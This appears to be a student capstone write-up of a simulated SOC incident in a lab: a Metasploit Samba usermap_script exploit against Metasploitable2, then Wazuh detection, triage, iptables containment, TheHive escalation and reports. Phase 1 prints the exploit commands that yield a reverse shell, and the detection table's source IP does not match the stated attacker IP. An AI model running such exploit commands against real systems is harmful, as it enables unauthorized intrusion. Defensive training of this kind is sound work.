# 🚀 Capstone Project: Full SOC Workflow Simulation

## 🎯 Objective

This project simulates a complete Security Operations Center (SOC) workflow, including attack execution, detection, triage, response, escalation, and reporting. The goal is to demonstrate real-world incident handling using industry-standard tools and methodologies.

---

## 🏗️ Lab Architecture

```
Kali Linux (Attacker)
        ↓
Metasploitable2 (Target + Wazuh Agent)
        ↓
Wazuh Server (Detection & Analysis)
        ↓
TheHive (Incident Management)
```

---

## 🛠️ Tools Used

* Metasploit (Attack simulation)
* Wazuh (SIEM & detection)
* TheHive (Incident response platform)
* iptables (Containment)
* VirusTotal & OTX (Threat intelligence)
* Linux utilities (ssh, netstat, logs)

---

# 🔥 Phase 1: Attack Simulation

## 📌 Method

A known vulnerability in Samba was exploited using Metasploit.

## ⚙️ Commands Used

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.231.135
set LHOSTS 192.168.231.137
run
```

## 🎯 Result

* Reverse shell obtained
* Unauthorized access confirmed

```bash
whoami
uname -a
```

## 🧠 Analysis

This demonstrates exploitation of remote services, mapped to:

* **MITRE ATT&CK:** T1210 (Exploitation of Remote Services)

---

# 🔍 Phase 2: Detection (Wazuh)

## 📌 Process

Wazuh monitored system logs and generated alerts based on suspicious activity.

## 📊 Detection Evidence

| Timestamp           | Source IP       | Alert Description      | MITRE Technique |
| ------------------- | --------------- | ---------------------- | --------------- |
| 2026-04-03 12:07:40 | 192.168.231.133 | Samba exploit activity | T1210           |

## 🔎 Observations

* Suspicious network activity detected
* Logs correlated with attack timeline
* Alerts generated based on abnormal behavior

---

# 🧠 Phase 3: Alert Triage

## 📌 Analysis Steps

* Reviewed alert severity (high)
* Verified repeated suspicious behavior
* Correlated logs with attack timeline

## ✅ Conclusion

The alert was confirmed as a **true positive**, indicating successful exploitation.

---

# 🌐 Phase 4: Threat Intelligence Enrichment

## 📌 Process

Indicators of Compromise (IOCs) were validated using external sources:

* VirusTotal
* AlienVault OTX (API + Web)

## 🔍 Findings

* IP associated with suspicious/malicious activity
* Linked to known scanning infrastructure
* Historical threat intelligence data available

## 🧠 Insight

Threat intelligence confirmed the legitimacy of the alert and improved confidence in detection.

---

# 🛡️ Phase 5: Response & Containment

## 📌 Action Taken

The attacker IP was blocked using firewall rules:

```bash
sudo iptables -A INPUT -s 192.168.231.137 -j DROP
```

## ✅ Verification

```bash
ping <target-ip>
```

* Connection blocked successfully
* No further communication from attacker

## 🧠 Outcome

The threat was contained, preventing further exploitation or lateral movement.

---

# 🚨 Phase 6: Incident Escalation (TheHive)

## 📌 Case Creation

A case was created in TheHive with the following details:

* **Title:** Samba Exploit Detected
* **Severity:** High
* **Tags:** T1210, Exploit

## 📝 Escalation Summary

A critical security incident involving exploitation of a Samba vulnerability was detected. The attacker gained unauthorized access to the system, triggering alerts in Wazuh. Immediate containment actions were taken, including isolating the system and blocking the attacker IP. The incident aligns with MITRE ATT&CK technique T1210 and has been escalated for further forensic investigation.

---

# 📄 Phase 7: Incident Report (SANS Format)

## 🧾 Executive Summary

A simulated cyberattack exploiting a Samba vulnerability was successfully executed and detected. The attacker gained unauthorized access to the system. Detection mechanisms identified the activity, and response actions were taken promptly to contain the threat.

## ⏱️ Timeline

* Attack initiated using Metasploit
* Wazuh generated alerts
* Analyst investigated logs
* System isolated and attacker blocked

## 🛠️ Response Actions

* Identified compromised system
* Blocked attacker IP
* Analyzed logs and confirmed exploitation

## 🔐 Recommendations

* Apply regular security patches
* Disable unnecessary services
* Implement continuous monitoring
* Strengthen authentication controls

---

# 🧾 Phase 8: Manager Briefing (Non-Technical)

A cybersecurity incident was detected involving unauthorized system access through a known vulnerability. The attack was quickly identified and contained using monitoring tools. The affected system was isolated, and the attacker was blocked. No significant damage was observed. Future prevention includes improving patch management and monitoring systems.

